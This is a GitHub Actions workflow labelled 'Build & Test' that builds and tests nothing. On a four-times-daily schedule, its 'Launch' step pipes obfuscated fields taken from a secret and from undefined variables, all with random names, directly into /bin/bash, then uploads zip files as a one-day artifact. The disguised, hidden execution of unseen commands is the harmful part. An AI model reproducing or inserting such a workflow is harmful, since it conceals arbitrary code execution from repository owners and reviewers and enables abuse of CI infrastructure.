name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '37 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Launch
        env:
          j88: ${{ secrets.j88 }}
        run: |
          printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
          printf '%s' "$cegd0" | jq -r .d83089 | /bin/bash
          echo $i96574 | jq -r .nmbnw50 | /bin/bash
          printf '%s' "$fnd1" | jq -r .x498 | /bin/bash
          printf '%s' "$qgbm32" | jq -r .w8718 | /bin/bash

      - name: Persist output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: BhPsK880
          path: "*.zip"
          retention-days: 1
